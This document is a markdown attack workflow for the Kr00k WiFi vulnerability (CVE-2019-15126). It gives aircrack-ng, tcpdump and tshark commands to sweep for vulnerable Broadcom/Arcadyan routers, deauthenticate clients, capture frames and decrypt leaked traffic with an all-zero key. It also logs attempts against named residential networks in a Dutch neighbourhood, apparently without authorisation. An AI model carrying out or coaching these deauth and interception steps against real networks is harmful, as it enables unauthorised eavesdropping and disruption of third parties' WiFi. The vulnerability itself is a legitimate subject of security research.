# Kr00k Attack Workflow (CVE-2019-15126)

Kr00k: Broadcom/Cypress WiFi chips encrypt post-disassociation data frames with an all-zero temporal key (TK). Data stuck in the AP's TX buffer gets transmitted in effectively-plaintext after a client disassociates.

## Quick Reference

| Step | Command |
|------|---------|
| Identify target | `airodump-ng wlan2 --band bg -w sweep --output-format csv` |
| Filter Broadcom + data>0 | Parse CSV, look for Arcadyan/ZTE/Broadcom OUIs |
| Lock channel | `iw dev wlan2 set channel <N>` (Android may fight this) |
| Capture ALL frames | `tcpdump -i wlan2 -w kr00k.pcap -c 500` |
| Surgical deauth | `aireplay-ng -0 2 -a <BSSID> wlan2` |
| Find post-deauth AP data | `tshark -r kr00k.pcap -Y 'wlan.sa==<BSSID> and wlan.fc.type==2 and frame.number><N>'` |

## Target Identification

Kr00k only affects Broadcom and Cypress WiFi chipsets:
- **KPN ISP routers** (Arcadyan SuperWiFi2.0, H220N) — BSSIDs starting with 8A:xx:xx
- **ZTE routers** (BWA series)
- **Some TP-Link** models
- **Some Ziggo/Compal** models

Check BSSID OUI with `hcxhashtool -i captures.22000 --info=stdout` — look for "Arcadyan", "Broadcom", "Cypress", or unknown locally-administered MACs (8A:xx, 8C:xx virtual BSSIDs often = Arcadyan base + 0x02).

## Critical Precondition: AP→Client Data

Most ISP routers are **dumb bridges** — they forward client→AP traffic but never originate AP→client data. Kr00k leaks whatever is in the AP's TX buffer at disassociation time. If the buffer is empty, there's nothing to leak.

Signs of AP→client traffic:
- Data frames FROM the AP's BSSID (not TO it)
- Broadcast/multicast sourced from AP MAC
- ARP replies, DHCP offers, group-key traffic

## Deauth Dos and Don'ts

- **DO** use 1-2 deauth shots (`-0 2`)
- **DO** broadcast deauth if targeting all clients (`-a <BSSID>` without `-c`)
- **DON'T** flood with 10+ deauths — saturates the channel, drowns the data you want
- **DON'T** use `-c <client>` unless you've confirmed the client exists in station list

## Post-Capture Analysis

1. Find the last deauth frame number: `tshark -r kr00k.pcap -Y 'wlan.fc.type_subtype==0x000c' -T fields -e frame.number | tail -1`
2. Find AP data frames after that: `tshark -r kr00k.pcap -Y 'wlan.sa==<BSSID> and wlan.fc.type==2 and frame.number><N>'`
3. If frames exist, try zero-TK decryption (TK = 00*16 for CCMP, or all-zeros key)

## Real-World Results (NL Neighborhood, May 2026)

| Target | Frames | AP→Client data? | Result |
|--------|--------|-----------------|--------|
| KPN7124A6 (ch6) | 20 | No | ✗ |
| KPN7124A6 (ch11) | 1 | No | ✗ |
| AmyenMilan (ch6) | 0 data frames total | No | ✗ |
| H220N123355 (ch1) | 61 client→AP, 0 AP→client | No | ✗ |
| BWA-0A6C60 (ch13, dish) | 10 | No | ✗ |

**Pattern:** All Arcadyan/Broadcom APs had zero AP→client data frames in post-deauth windows. They only transmit beacons and probe responses. No kr00k leakage observed.

## Diagnostic: AP Self-Deauth

When the AP responds to your deauth with its own deauth frames (from AP BSSID), it's protecting itself. H220N123355 sent 512 deauths in response to our 2. This suggests deauth protection (not PMF-based — PMF was disabled in beacon). The AP is actively fighting back.
